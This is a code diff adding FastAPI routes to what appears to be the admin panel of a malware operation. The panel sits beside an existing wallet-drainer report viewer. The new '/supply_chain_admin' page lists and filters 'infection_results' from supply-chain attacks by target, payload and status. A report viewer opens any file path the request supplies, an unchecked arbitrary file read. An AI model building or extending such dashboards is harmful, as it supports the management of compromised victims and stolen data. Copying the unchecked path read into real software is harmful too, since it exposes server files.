@@ -1984,3 +1984,43 @@ async def wallet_drainer_view_report(request: Request, path: str):
     with open(path, 'r') as f:
         data = json.load(f)
     return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
+
+@app.get("/supply_chain_admin", response_class=HTMLResponse)
+async def supply_chain_admin(request: Request, target: str = "", payload: str = "", status: str = ""):
+    # Сканируем отчеты
+    reports = []
+    base_dir = os.path.join("extracted_data", "supply_chain")
+    for root, dirs, files in os.walk(base_dir):
+        for file in files:
+            if file.endswith("supply_chain_report.json") or file.startswith("supply_chain_report_"):
+                try:
+                    with open(os.path.join(root, file), 'r') as f:
+                        data = json.load(f)
+                        filtered_results = []
+                        for r in data.get("infection_results", []):
+                            if target and target.lower() not in r.get("target", {}).get("name", "").lower():
+                                continue
+                            if payload and r.get("payload") != payload:
+                                continue
+                            if status and r.get("status") != status:
+                                continue
+                            filtered_results.append(r)
+                        if filtered_results:
+                            data["infection_results"] = filtered_results
+                            data["report_file"] = os.path.join(root, file)
+                            reports.append(data)
+                        elif not target and not payload and not status:
+                            data["report_file"] = os.path.join(root, file)
+                            reports.append(data)
+                except Exception:
+                    continue
+    reports.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
+    return templates.TemplateResponse("supply_chain_admin.html", {"request": request, "reports": reports})
+
+@app.get("/supply_chain_admin/view_report", response_class=HTMLResponse)
+async def supply_chain_view_report(request: Request, path: str):
+    if not os.path.exists(path):
+        return HTMLResponse("<h3>Report not found</h3>", status_code=404)
+    with open(path, 'r') as f:
+        data = json.load(f)
+    return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
